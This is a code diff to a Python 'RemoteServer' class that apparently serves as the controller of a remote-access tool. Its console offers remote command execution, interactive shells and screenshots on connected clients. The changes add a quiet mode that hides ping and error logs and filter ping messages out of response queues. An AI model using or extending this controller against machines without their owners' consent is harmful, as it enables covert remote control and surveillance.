@@ -20,6 +20,8 @@ class RemoteServer:
         self.server_socket = None
         self.running = False
         self.lock = threading.Lock()
+        self.quiet_mode = True  # Set to False to see all ping messages
+        self.last_ping_time = {}  # Track last ping time per client
         
     def start(self):
         """Start the server"""
@@ -71,6 +73,7 @@ class RemoteServer:
                         }
                         self.command_queues[client_id] = queue.Queue()
                         self.client_responses[client_id] = queue.Queue()
+                        self.last_ping_time[client_id] = time.time()
                     
                     print(f"[+] Client {client_id} connected - {client_info.get('os', 'Unknown')}")
                     
@@ -98,16 +101,19 @@ class RemoteServer:
                 if client_id in self.command_queues:
                     try:
                         command = self.command_queues[client_id].get_nowait()
-                        print(f"[*] Sending command to {client_id}: {command.get('type', 'unknown')}")
+                        if not self.quiet_mode:
+                            print(f"[*] Sending command to {client_id}: {command.get('type', 'unknown')}")
                         self.send_data(client_socket, command)
                         
                         # Wait for response with timeout
                         response = self.receive_data_with_timeout(client_socket, timeout=30)
                         if response:
-                            print(f"[*] Received response from {client_id}")
+                            if not self.quiet_mode:
+                                print(f"[*] Received response from {client_id}")
                             self.client_responses[client_id].put(response)
                         else:
-                            print(f"[!] No response from {client_id}")
+                            if not self.quiet_mode:
+                                print(f"[!] No response from {client_id}")
                             
                     except queue.Empty:
                         pass  # No commands to send
@@ -116,8 +122,29 @@ class RemoteServer:
                 try:
                     data = self.receive_data(client_socket, timeout=0.5)
                     if data:
-                        print(f"[*] Received data from {client_id}: {data.get('type', 'unknown')}")
+                        response_type = data.get('type', 'unknown')
+                        
+                        # Filter ping messages
+                        if response_type == 'ping':
+                            # Only log first ping or if quiet mode is off
+                            current_time = time.time()
+                            last_ping = self.last_ping_time.get(client_id, 0)
+                            
+                            if not self.quiet_mode or current_time - last_ping > 300:  # Log every 5 minutes in quiet mode
+                                print(f"[*] Ping from {client_id} - connection alive")
+                                self.last_ping_time[client_id] = current_time
+                            
+                            # Update last seen but don't queue ping as response
+                            with self.lock:
+                                if client_id in self.clients:
+                                    self.clients[client_id]['last_seen'] = time.time()
+                            continue
+                        
+                        # For non-ping messages, log and queue
+                        if not self.quiet_mode:
+                            print(f"[*] Received data from {client_id}: {response_type}")
                         self.client_responses[client_id].put(data)
+                        
                 except socket.timeout:
                     pass
                 
@@ -131,7 +158,8 @@ class RemoteServer:
             except socket.timeout:
                 continue
             except Exception as e:
-                print(f"[!] Error with client {client_id}: {e}")
+                if not self.quiet_mode:
+                    print(f"[!] Error with client {client_id}: {e}")
                 break
         
         # Clean up disconnected client
@@ -142,6 +170,8 @@ class RemoteServer:
                 del self.command_queues[client_id]
             if client_id in self.client_responses:
                 del self.client_responses[client_id]
+            if client_id in self.last_ping_time:
+                del self.last_ping_time[client_id]
         
         print(f"[-] Client {client_id} disconnected")
         if client_socket:
@@ -160,11 +190,16 @@ class RemoteServer:
             'command_id': int(time.time() * 1000)  # Unique command ID
         }
         
-        # Clear any old responses
+        # Clear any old responses (except pings which are filtered)
         if client_id in self.client_responses:
             while not self.client_responses[client_id].empty():
                 try:
-                    self.client_responses[client_id].get_nowait()
+                    response = self.client_responses[client_id].get_nowait()
+                    # Only discard if it's a ping
+                    if response.get('type') != 'ping':
+                        # Put it back if it's not a ping (shouldn't happen)
+                        self.client_responses[client_id].put(response)
+                        break
                 except queue.Empty:
                     break
         
@@ -179,6 +214,9 @@ class RemoteServer:
             if client_id in self.client_responses:
                 try:
                     response = self.client_responses[client_id].get(timeout=0.5)
+                    # Skip ping responses
+                    if response.get('type') == 'ping':
+                        continue
                     return response
                 except queue.Empty:
                     pass
@@ -207,7 +245,8 @@ class RemoteServer:
             sock.sendall(json_data)
             return True
         except Exception as e:
-            print(f"[!] Send error: {e}")
+            if not self.quiet_mode:
+                print(f"[!] Send error: {e}")
             return False
     
     def receive_data(self, sock, timeout=None):
@@ -255,7 +294,10 @@ class RemoteServer:
         print("  cmd <client> <command> - Execute command on client")
         print("  shell <client>    - Start interactive shell")
         print("  screenshot <client> - Take screenshot from client")
+        print("  quiet <on/off>    - Toggle quiet mode (default: on)")
         print("  quit              - Exit server")
+        print("="*60)
+        print("[*] Quiet mode is ON - ping messages are suppressed")
         print("="*60)
         
         while self.running:
@@ -282,6 +324,9 @@ class RemoteServer:
                 elif command.startswith('screenshot '):
                     self.handle_screenshot_command(command)
                 
+                elif command.startswith('quiet '):
+                    self.handle_quiet_command(command)
+                
                 else:
                     print("[!] Unknown command")
                     
@@ -301,11 +346,16 @@ class RemoteServer:
                 print("\nConnected Clients:")
                 print("-" * 60)
                 for client_id, client_info in self.clients.items():
+                    last_ping = self.last_ping_time.get(client_id, 0)
+                    time_since_ping = time.time() - last_ping
+                    
                     print(f"ID: {client_id}")
                     print(f"  Address: {client_info['address']}")
                     print(f"  OS: {client_info['info'].get('os', 'Unknown')}")
                     print(f"  User: {client_info['info'].get('user', 'Unknown')}")
                     print(f"  Last Seen: {time.time() - client_info['last_seen']:.1f}s ago")
+                    print(f"  Last Ping: {time_since_ping:.1f}s ago")
+                    print(f"  Status: {'Active' if time_since_ping < 60 else 'Idle'}")
                     print("-" * 60)
     
     def handle_cmd_command(self, command):
@@ -375,6 +425,25 @@ class RemoteServer:
         else:
             print("[!] Usage: screenshot <client_id>")
     
+    def handle_quiet_command(self, command):
+        """Handle quiet mode command"""
+        parts = command.split(' ', 1)
+        if len(parts) >= 2:
+            mode = parts[1].lower()
+            if mode in ['on', 'true', '1', 'yes']:
+                self.quiet_mode = True
+                print("[*] Quiet mode: ON (ping messages suppressed)")
+            elif mode in ['off', 'false', '0', 'no']:
+                self.quiet_mode = False
+                print("[*] Quiet mode: OFF (all messages shown)")
+            else:
+                print("[!] Usage: quiet <on/off>")
+        else:
+            # Toggle current mode
+            self.quiet_mode = not self.quiet_mode
+            status = "ON" if self.quiet_mode else "OFF"
+            print(f"[*] Quiet mode toggled: {status}")
+    
     def handle_response(self, client_id, response):
         """Handle response from client"""
         response_type = response.get('type', 'unknown')
@@ -424,7 +493,8 @@ class RemoteServer:
             print(f"[!] Error from {client_id}: {response.get('data', 'Unknown error')}")
         
         elif response_type == 'ping':
-            pass  # Ignore ping responses
+            # Should not reach here as pings are filtered earlier
+            pass
         
         else:
             print(f"[?] Unknown response type from {client_id}: {response_type}")
